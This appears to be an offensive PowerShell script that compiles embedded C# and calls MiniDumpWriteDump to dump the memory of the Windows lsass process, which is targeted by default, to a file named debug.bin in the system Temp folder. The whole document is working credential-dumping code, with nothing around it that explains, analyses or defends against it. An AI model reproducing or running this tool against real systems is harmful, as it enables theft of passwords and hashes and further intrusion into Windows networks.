    
Function MiniDump {
$MiniDump = @"
using System.Security.Principal;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System;

public class MDump {

[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

public static string Minidump(int pid = -1)
{
	
	IntPtr targetProcessHandle = IntPtr.Zero;
	uint targetProcessId = 0;

	Process targetProcess = null;
	if (pid == -1)
	{
		Process[] processes = Process.GetProcessesByName("lsass");
		targetProcess = processes[0];
	}
	else
	{
		try
		{
			targetProcess = Process.GetProcessById(pid);
		}
		catch (Exception ex)
		{
			return String.Format("[X]Exception: {0}", ex.Message);
		}
	}

	try
	{
		targetProcessId = (uint)targetProcess.Id;
		targetProcessHandle = targetProcess.Handle;
	}
	catch (Exception ex)
	{
		return String.Format("[X] Error getting handle to {0} ({1}): {2}", targetProcess.ProcessName, targetProcess.Id, ex.Message);
	}
	bool bRet = false;

	string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
	string dumpFile = String.Format("{0}\\Temp\\debug.bin", systemRoot);

	using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
	{
		bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
	}
	if (bRet)
	{
		return "[+] Dump successful - " + dumpFile;
	}
	else
	{
		return String.Format("[X] Dump failed: {0}", bRet);
	}
}

}
"@
Add-Type $MiniDump
$ptr = [MDump]::Minidump()
echo $ptr
}
